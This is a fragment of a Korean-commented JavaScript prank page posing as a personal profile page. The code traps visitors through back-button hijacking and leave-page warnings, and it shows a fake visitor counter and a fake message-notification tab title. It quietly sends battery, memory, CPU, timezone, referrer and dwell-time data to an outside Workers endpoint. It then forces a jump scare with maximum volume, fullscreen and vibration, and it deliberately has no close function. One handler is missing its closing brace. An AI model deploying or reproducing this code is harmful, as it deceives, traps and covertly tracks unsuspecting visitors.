            90% { transform: translate(1px, 2px) rotate(0deg); }

        // ==========================================
        // 🔒 1. 갇힘(Trap) 시스템 발동 로직
        // ==========================================
        
        // [Trap A] 뒤로 가기 함정 (History API)
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1); // 다시 원래 자리로 밀어넣음
            if (!isPrankActive) triggerPrank(); // 뒤로 가기 누르면 낚시 즉시 발동

        window.addEventListener('beforeunload', function (e) {
            if (!isPrankActive && !hasSeenPicture) {
                e.preventDefault();
                e.returnValue = ''; // 최신 브라우저 규격 강제 이탈 경고
            }
        });

        // [Trap C] 탭 이탈 시 제목 변경 (돌아오게 만들기)
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                document.title = "💬 새로운 메시지가 도착했습니다"; 
            } else {
                document.title = "HanJiyu07 | Profile & Stats";
            }
        });

        // 📈 2. 실시간 방문자 페이크 로직
        // ==========================================
        const countEl = document.getElementById('visitor-count');
        let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
        countEl.innerText = currentCount;
        setInterval(() => {
            const change = Math.floor(Math.random() * 7) - 3;
            currentCount += change;
            if (currentCount < 120) currentCount = 120;
            if (currentCount > 300) currentCount = 300;
            countEl.innerText = currentCount;
        }, 4000);

        // ==========================================
        // 📡 3. 서버리스 백엔드 통신 및 기기 정보 수집
        // ==========================================
        const WORKER_URL = "https://flat-night-2b27.chldudwo2158.workers.dev"; 
        const startTime = new Date();
        let isPrankActive = false;
        let hasSeenPicture = false;

        function getDwellTime() { return ((new Date() - startTime) / 1000).toFixed(2); }

        function logToBackend(type) {
            if (WORKER_URL.includes("YOUR_WORKER_SUBDOMAIN") || !WORKER_URL) return;
            fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: type,
                    referrer: document.referrer || "직접 입력/북마크",
                    dwellTime: getDwellTime(),
                    userData: userData
                })
            }).catch(err => console.log("로그 전송 실패"));
        }

        let userData = {
            battery_info: null,
            timeZone: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }),
            deviceMemory: navigator.deviceMemory || '알 수 없음',
            cpuCores: navigator.hardwareConcurrency || '알 수 없음'
        };
        
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                const level = Math.round(battery.level * 100); 
                const isCharging = battery.charging ? "충전 중 ⚡" : "배터리 사용 중 🔋";
                userData.battery_info = `현재 배터리: **${level}%** (${isCharging})`;
                logToBackend("entry");
            });
        } else {
            userData.battery_info = "이 기기(또는 브라우저)는 배터리 정보 조회를 지원하지 않습니다. 🥲";
            logToBackend("entry");
        }

        // ==========================================
        // 🎭 4. 지옥문 오픈 (Prank 발동 로직)
        // ==========================================
        const prankBtns = document.querySelectorAll('.js-prank-btn');
        const prankZone = document.getElementById('prank-zone');
        const overlay = document.getElementById('overlay');
        const audio = document.getElementById('bark-sound');

        function triggerPrank() {
            if (isPrankActive) return;
            isPrankActive = true;

            // 시각 효과(지진/점멸) 활성화
            document.body.classList.add('horror-active');
            
            // 소리 최대화 (시스템 볼륨 내 100%)
            audio.volume = 1.0; 

            // 전체화면 강제 시도 (에러 무시)
            const docEl = document.documentElement;
            if (docEl.requestFullscreen) {
                docEl.requestFullscreen().catch(err => {
                    console.log("전체화면 차단됨 (사진만 띄웁니다)");
                });
            }

            // 기기 진동 (심장 박동 패턴)
            if ('vibrate' in navigator) {
                navigator.vibrate([100, 50, 100, 50, 800, 100, 1000]); 
            }

            // 백엔드로 성공 로그 전송 (최초 1회만)
            if (!hasSeenPicture) {
                hasSeenPicture = true;
                logToBackend("success");
            }

            // 귀신 및 소리 출력
            overlay.style.display = 'block';
            prankZone.style.display = 'block';
            audio.play().catch(e => console.log("오디오 자동 재생 차단됨"));

            // 버튼 텍스트 변경
            prankBtns.forEach(btn => {
                btn.innerText = "귀신이 튀어나왔습니다!";
                btn.style.animation = "none";
            });
            
            // 배경 스크롤 차단
            document.body.style.overflow = 'hidden';
        }

        // 🟢 [루트 A] 버튼 클릭 시 가짜 로딩 후 발동 (몰입감 극대화)
        prankBtns.forEach(btn => {
            btn.addEventListener('click', function(e) { 
                e.stopPropagation(); 
                
                // 가짜 로딩 텍스트
                this.innerText = "🎥 시크릿 영상 연결 중...";
                this.style.opacity = "0.7";
                
                // 0.8초 딜레이 후 발동
                setTimeout(() => { triggerPrank(); }, 800);
            });
        });

        // 🟢 [루트 B] 빈 화면 터치 시 즉시 발동
        document.body.addEventListener('click', function(e) {
            if (e.target !== overlay && e.target !== prankZone && e.target !== document.getElementById('maltese-img')) {
                triggerPrank();
            }
        });

        // 🟢 [루트 C] 6.9초 동안 아무 클릭이 없을 시 자동 발동
        setTimeout(() => { triggerPrank(); }, 6900); 

        // 💡 주의: 귀신을 끄는 closePrank 함수를 영구 삭제했습니다! 
        // 이제 탭을 끄지 않는 이상 이 화면에서 절대 벗어날 수 없습니다.
    </script>
